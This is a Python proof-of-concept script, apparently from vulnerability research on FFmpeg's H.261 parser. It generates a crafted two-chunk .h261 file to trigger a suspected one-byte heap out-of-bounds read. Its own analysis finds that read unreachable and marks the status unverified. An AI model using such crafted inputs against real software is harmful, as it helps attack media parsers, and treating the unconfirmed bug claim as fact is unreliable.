#!/usr/bin/env python3
"""
VULN-001: h261_find_frame_end returns -1 causing 1-byte heap OOB read in ff_combine_frame.

ANALYSIS SUMMARY:
=================

The bug: h261_find_frame_end() can return -1 (i-2 when i=1 in the second scan loop).
ff_combine_frame() then accesses pc->buffer[pc->last_index + (-1)].
If pc->last_index == 0, this becomes pc->buffer[-1] -- a 1-byte heap OOB read.

TRIGGER MECHANISM (verified by simulation):
-------------------------------------------

Packet 1 SETUP (1024 bytes): [0x00, 0x00, 0x01, 0x00, 0x00*1020]

  With pc->state=0x00000000 (initial), frame_start_found=0:
  - First loop: i=3: state=0x00000100. j=0: (0x100>>0)&0xFFFFF0=0x100=0x000100. MATCH.
    vop_found=1. Second loop runs from i=4 to 1023 (all zeros).
    After 4 more bytes, state cycles: 0x00010000→0x01000000→0→0→...
    No second match found.
  - Returns END_NOT_FOUND. pc->frame_start_found=1. pc->state=0x00000000.
  - ff_combine_frame(END_NOT_FOUND): pc->index=1024. pc->buffer allocated.

Packet 2 TRIGGER (1024 bytes): [0x01, 0x00, 0x00, 0x00, ...]

  With pc->state=0x00000000, frame_start_found=1:
  - Second loop starts at i=0 (since frame_start_found=1, vop_found=1 initially).
  - i=0: state=(0x00000000<<8)|0x01=0x00000001.
    j=0..7: 0x01>>j&0xFFFFF0 all =0. NO MATCH.
  - i=1: state=(0x00000001<<8)|0x00=0x00000100.
    j=0: (0x100>>0)&0xFFFFF0=0x100=0x000100. MATCH.
    Returns 1-2 = -1. pc->frame_start_found=0. pc->state=(0x100>>24)+0xFF00=0xFF00.

  ff_combine_frame(next=-1, pc->index=1024, pc->overread=0):
  - pc->last_index = pc->index = 1024.
  - if (pc->index): 1024>0. Append block runs. pc->index=0.
  - Store overread (next=-1..0):
      pc->buffer[1024 + (-1)] = pc->buffer[1023].  <- VALID (last byte of setup packet)
  - pc->overread=1. Returns 0.

  h261_parse returns -1. av_parser_parse2 clamps to 0. 0 bytes consumed.

THE OOB GAP:
  For pc->buffer[-1] to be accessed, pc->last_index must be 0.
  pc->last_index = pc->index (after overread copy) = 0 requires pc->index=0 AND pc->overread=0.
  pc->index=0 at this call requires a prior frame delivery (next>=0) with pc->index>0.
  But: any prior frame delivery resets frame_start_found=0, and after that
  h261_find_frame_end CANNOT return -1 for the next call (proven: consecutive
  state_0/state_1 matches at i=0,i=1 require state_0 bits 8-15 > 0 AND
  state_1 bits 16-23 = state_0 bits 8-15 = 0, which is a mathematical contradiction
  for all j in 0..7). The theoretical OOB at pc->buffer[-1] is UNREACHABLE.

  The actual OOB access in this scenario: pc->buffer[1024-1]=pc->buffer[1023] (valid).

SECOND ITERATION (0 bytes consumed, same buf):
  pc->overread=1, pc->index=0. pc->state=0xFF00, frame_start_found=0.

  ff_combine_frame first copies overread: pc->index=1. pc->overread=0.
  h261_find_frame_end(pc_state=0xFF00, fsf=0, buf=[0x01,0x00,...]):
  - i=0: state=(0xFF00<<8)|0x01=0x00FF0001. j=0..7: no match.
  - i=1: state=(0x00FF0001<<8)|0x00=0xFF000100.
    j=0: 0xFF000100 & 0x00FFFFF0 = 0x00000100. MATCH. vop_found=1. i->2.
  - Second loop i=2: state=0x00010000. No match. i=3+: 0. No match.
  - END_NOT_FOUND. fsf=1. state=0.

  ff_combine_frame(END_NOT_FOUND, pc->index=1): pc->index grows. Returns -1.
  h261_parse returns 1024 (remaining bytes). av_parser_parse2 returns 1024. Demux advances.

  The infinite loop in Phase A is BROKEN by the second iteration returning END_NOT_FOUND.
"""

import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(SCRIPT_DIR, 'vuln_001_input.h261')

# The raw H.261 demuxer reads files in 1024-byte chunks (RAW_PACKET_SIZE = 1024).
# We craft exactly 2 chunks.

# --- Chunk 1 (1024 bytes) ---
# Purpose: set frame_start_found=1 with pc->state=0x00000000.
# Start with [0x00, 0x00, 0x01, 0x00] to trigger vop_found at i=3 (state=0x00000100).
# After that, pad with zeros. The second loop runs over zeros:
#   i=4: state=0x00010000 (no match for j=0..7)
#   i=5: state=0x01000000 (no match)
#   i=6: state=0x00000000 (overflow, no match)
#   i=7+: state=0 (no match)
# Returns END_NOT_FOUND with frame_start_found=1, pc->state=0.
chunk1 = b'\x00\x00\x01\x00' + b'\x00' * 1020
assert len(chunk1) == 1024

# --- Chunk 2 (1024 bytes) ---
# Purpose: trigger h261_find_frame_end returning -1.
# With frame_start_found=1 and pc->state=0:
#   Second loop starts at i=0 (frame_start_found=1 means vop_found=1 initially).
#   i=0: state=(0<<8)|0x01=0x00000001. j=0..7: no match (all < 0x100 range).
#   i=1: state=(0x01<<8)|0x00=0x00000100. j=0: 0x100&0xFFFFF0=0x100. MATCH. Return 1-2=-1.
chunk2 = b'\x01\x00' + b'\x00' * 1022
assert len(chunk2) == 1024

data = chunk1 + chunk2

with open(OUTPUT_FILE, 'wb') as f:
    f.write(data)

print(f"Generated {OUTPUT_FILE} ({len(data)} bytes)")
print()
print("Trigger sequence:")
print("  Chunk 1 (bytes 0-1023): [0x00,0x00,0x01,0x00, zeros...]")
print("    - At i=3: state=0x00000100 -> vop_found=1 (j=0 match in first loop)")
print("    - Second loop: zeros -> state cycles 0x00010000->0x01000000->0->0")
print("    - No second match -> END_NOT_FOUND. fsf=1. pc->state=0x00000000.")
print("    - ff_combine_frame: pc->index=1024. pc->buffer allocated.")
print()
print("  Chunk 2 (bytes 1024-2047): [0x01,0x00,zeros...]")
print("    - frame_start_found=1: second loop starts at i=0 directly.")
print("    - i=0: state=0x00000001. No j=0..7 match.")
print("    - i=1: state=0x00000100. j=0: match -> return 1-2 = -1.")
print("    - ff_combine_frame(next=-1): pc->last_index=1024, pc->index=0 after append.")
print("      Store overread: pc->buffer[1024-1]=pc->buffer[1023] (VALID access).")
print("      pc->overread=1.")
print()
print("  Note: The theoretical OOB at pc->buffer[-1] requires pc->last_index=0,")
print("  which requires pc->index=0 at the call, which requires frame_start_found=0")
print("  from a prior frame delivery. But frame_start_found=0 makes h261_find_frame_end")
print("  unable to return -1 (mathematical proof: consecutive i=0,i=1 matches require")
print("  state_0 bits[8:15]!=0 AND state_1 bits[16:23]=0=state_0 bits[8:15], contradiction).")
print("  Status: UNVERIFIED - code path exercised but OOB at pc->buffer[-1] unreachable.")
